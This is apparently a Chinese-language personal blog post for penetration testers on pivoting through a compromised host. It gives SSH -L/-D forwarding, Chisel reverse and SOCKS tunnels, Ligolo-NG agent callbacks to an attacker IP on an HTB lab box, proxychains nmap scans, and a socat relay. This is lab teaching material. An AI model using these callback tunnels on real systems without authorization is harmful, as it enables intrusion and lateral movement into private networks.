---
title: 关于端口转发我知道的那些事 # 从 Astro 的 title 转换
date: 2025/05/31 23:57:11 # 从 Astro 的 published 转换，并添加一个默认时间 (例如，早上9点)，使用您指定的日期格式
# updated: YYYY/MM/DD HH:MM:SS # 可选，如果文章有更新日期，可以添加此字段
description: 关于端口转发我知道的 # 从 Astro 的 description 转换
cover: /images/tunnel.jpg # 从 Astro 的 image 转换，注意路径前添加 '/' 表示根目录，并假设 cover13.jpg 放在 images 目录下
tags: # 从 Astro 的 tags 转换
  - 端口转发
categories: # 从 Astro 的 category 转换，Hexo 常用 categories (复数)
  - 工具
# 以下是 Redefine 主题特有或常用的可选字段，根据您的需求选择性添加
# author: 您的名字 # 可选，如需显示文章作者
# avatar: /img/your-avatar.png # 可选，如需显示作者头像
# password: your_secret_password # 文章加密，根据需要添加
# message: 本文已加密，请输入密码。 # 加密提示信息
# encrypt_abstract: 加密文章摘要。
# sticky: 1 # 置顶文章，数值越大优先级越高
# comment: true # 是否开启评论，默认开启
# toc: true # 是否显示目录，默认开启
# math: false # 是否开启数学公式，默认关闭
# mermaid: false # 是否开启 Mermaid 图表，默认关闭
---
## 关于代理穿透，我知道的那些事

在渗透测试的旅程中，我们常常会面临一个棘手的挑战：如何在已经获得初步立足点（Initial Foothold）的机器上，进一步深入内网，访问那些不对外暴露的服务或机器。这就是“代理穿透”（Proxy Pivoting）的意义所在。

### Why Need Proxy? 为什么我们需要代理穿透？

当你成功入侵一台靶机后，你可能会发现，这台机器只是内网中的一个“跳板”。它可能连接着其他更为敏感或重要的资产，但这些资产的网络服务（例如数据库、管理后台、SSH服务等）仅对内网开放，或者有严格的防火墙规则限制外部访问。

具体来说，以下几种情况会促使我们进行代理穿透：

- 访问内网服务： 靶机上存在一些只监听 127.0.0.1（localhost）或内网IP地址的端口。
- 横向移动： 靶机所在的子网内，存在其他无法直接从外网访问的机器。
- 规避防火墙： 即使内网机器对外网开放了某些端口，防火墙也可能限制了特定IP地址（例如你的攻击机IP）的访问。
- 代理穿透的核心目标是：将靶机本地或内网的端口/服务，通过某种方式映射到攻击机上，使我们能够像直接访问它们一样，进行后续的探测、利用和横向移动。

### How to Proxy? 我们如何进行代理？

#### 工具选择：代理穿透的利器

市面上已经有许多成熟的工具可以帮助我们实现代理穿透。它们各有特点，适用于不同的场景：

- SSH: SSH不仅用于远程登录，更是进行端口转发的强大工具。它的通信加密，支持本地端口转发（L）、远程端口转发（R）和动态端口转发（D，SOCKS代理）。
- Chisel: 用Go语言编写的HTTP/SOCKS隧道工具。它能够快速建立反向隧道（Reverse Tunnel）或正向隧道（Forward Tunnel），将SOCKS5代理流量通过HTTP/HTTPS传输。支持各钟主流平台
- Ligolo-NG: Ligolo-NG的设计目标是解决传统SOCKS代理在网络不稳定或存在丢包情况下的问题，它通过UDP over TCP协议实现更稳定的连接，并且提供了更强大的流量转发和管理功能。
#### 具体使用
##### ssh

###### 将靶机指定本地端口转发到攻击机

```bash
# 在攻击机（AttackerA）上执行
# 将靶机192.168.1.100上的127.0.0.1:8080服务，映射到攻击机本地的8088端口
ssh -L 8088:127.0.0.1:8080 user@192.168.1.100
```

有以下几个可选的参数

- `-N`: 不执行远程命令，仅用于端口转发。
- `-f`: 后台运行。
- `-q`: 静默模式，不输出警告和诊断信息。

如果有什么你攻击机内网的服务想让靶机能够访问的话，只要在靶机上执行上面的命令连接攻击机即可~~这种需求多少有点奇怪吧，而且还容易暴漏自己~~

###### 除了上面这种指定端口的静态转发，ssh还支持我们进行动态端口转发，配合proxychain可以达到几乎无感的内网访问。

**命令格式：** `ssh -D [AttackerA_Listen_Port] user@ServerB_IP`

**示例：** 假设靶机（`192.168.1.100`）连接着一个`10.0.0.0/24`的内网，我们想通过靶机访问这个内网。

```bash
# 在攻击机（AttackerA）上执行
# 在攻击机本地建立一个SOCKS5代理，监听在1080端口
ssh -D 1080 user@192.168.1.100
```

隧道建立后，攻击机本地的`127.0.0.1:1080`就成为了一个SOCKS5代理。你可以配置Proxychains等工具来使用这个代理。

**配置 Proxychains (`/etc/proxychains.conf` 或 `~/.proxychains/proxychains.conf`)：** 编辑配置文件，在末尾添加或修改代理设置：

```te
# uncomment this to use proxychains with SOCKS5 (or SOCKS4) proxy
socks5 127.0.0.1 1080
```

**使用 Proxychains 访问内网：**

```
# 通过代理扫描内网主机
proxychains nmap -sT -Pn 10.0.0.101
# 通过代理连接内网SSH服务
proxychains ssh user@10.0.0.102
```

**注意：**

- `ssh -D`默认创建的是SOCKS5代理。
- Proxychains可以配合几乎所有基于TCP的工具使用，如`curl`、`wget`、`sqlmap`等。

##### chisel

###### 单端口转发模式

chisel是单程序文件，通过参数来指定是服务端模式(server)还是客户端模式(agent)

**在攻击机（AttackerA）上启动 Chisel 服务器：** 攻击机监听一个端口，等待靶机的Chisel客户端连接。

```bash
# 在攻击机上监听8000端口作为Chisel服务器，不转发任何端口，仅接受客户端连接
chisel server --reverse -p 8000
```

**在靶机（ServerB）上运行 Chisel 客户端：** 靶机连接到攻击机的Chisel服务器，并指定要转发的端口

```bash
# 在靶机上连接攻击机的Chisel服务器（192.168.1.5:8000）
# 并将靶机本地的127.0.0.1:8080服务，反向隧道到攻击机本地的8088端口
chisel client 192.168.1.5:8000 R:8088:127.0.0.1:8080
```

###### 动态端口转发模式

**在攻击机（AttackerA）上启动 Chisel 客户端：** 攻击机连接到靶机上运行的Chisel服务器，并在本地监听一个SOCKS端口。

```bash
# 在攻击机上连接靶机的Chisel服务器（192.168.1.100:8000）
# 并在本地监听1080端口作为SOCKS5代理
chisel client 192.168.1.100:8000 SOCKS:1080
```

**在靶机（ServerB）上启动 Chisel 服务器：** 靶机监听一个端口作为Chisel服务器，并作为SOCKS代理的出口。

```bash
# 在靶机上监听8000端口作为Chisel服务器
chisel server -p 8000 --socks5
```

配置成功后配合proxychain进行利用

##### Ligolo-NG

这个工具是在看一个师傅的博客时候看到的，昨天晚上大概看了一遍使用文档，借着写文章的机会找一台靶机利用一下。~~为了这碟醋包饺子属于是~~

###### 安装&初始化

```bash
#以下是安装命令，但是最佳实践是直接从官方的git仓库下载最新的版本。
$ apt install ligolo-ng
#以下是初始化
#创建名为ligolo的网卡
#也可以用proxy端自带的创建网卡的命令，这里不再赘述
$ sudo ip tuntap add user [your_username] mode tun ligolo
$ sudo ip link set ligolo up

```

###### 服务端启动

```bash
#启动proxy客户端，附加-selfcert参数
┌──(kali㉿kali)-[~/HTB/Eureka]
└─$ sudo ligolo-proxy -selfcert
INFO[0000] Loading configuration file ligolo-ng.yaml    
WARN[0000] Using default selfcert domain 'ligolo', beware of CTI, SOC and IoC! 
ERRO[0000] Certificate cache error: acme/autocert: certificate cache miss, returning a new certificate 
INFO[0000] Listening on 0.0.0.0:11601                   
    __    _             __                       
   / /   (_)___ _____  / /___        ____  ____ _
  / /   / / __ `/ __ \/ / __ \______/ __ \/ __ `/
 / /___/ / /_/ / /_/ / / /_/ /_____/ / / / /_/ / 
/_____/_/\__, /\____/_/\____/     /_/ /_/\__, /  
        /____/                          /____/   

  Made in France ♥            by @Nicocha30!
  Version: dev
ligolo-ng » 
```

此时会自动监听11601端口，我们通过各种手段将agent客户端上传到立足点靶机之后即可通过以下命令和proxy服务端建立连接

```bash
./agent  -connect 10.10.16.37:11601 -ignore-cert
```

![image-20250531232731612](https://raw.githubusercontent.com/Enchanter-W/Pics/master/image-20250531232731612.png)

此时攻击机收到session会话，然后可以通过`ifconfig`命令来看到靶机上有哪些网卡网段。

通过在攻击机执行以下命令，可以将我们需要访问的网段代理出来

```bash
[Agent : oscar190@eureka] » tunnel_start --tun ligolo    
INFO[1121] Starting tunnel to oscar190@eureka (005056b974b1) 
[Agent : oscar190@eureka] » add_route --name 'ligolo' --route '240.0.0.1/32'
INFO[1215] Route created.
```

上面的命令我指定网段是240.0.0.1/32，这是ligolo的一个特殊功能，用来代理靶机的本地ip[127.0.0.1]。这个网段是保留ip还没有被启用。

完成上面的内容后理论上我们就完全如同拥有和立足点相同的网络了。

###### 与socat协作

这个工具我是第一次用，可能以后会补充其他用法。

这个场景是你需要立足点机器当跳板机让内网靶机的ligolo-agent连接回攻击机时候，即内网靶机不出网但能联通立足点机器。

在立足点机器上执行

```bash
socat TCP-LISTEN:6666,fork,reuseaddr TCP:[攻击机ip]:6666
```

这时候在内网靶机上执行`ligolo-agent --connect [立足点机器ip]:[立足点机器socat监听端口]`

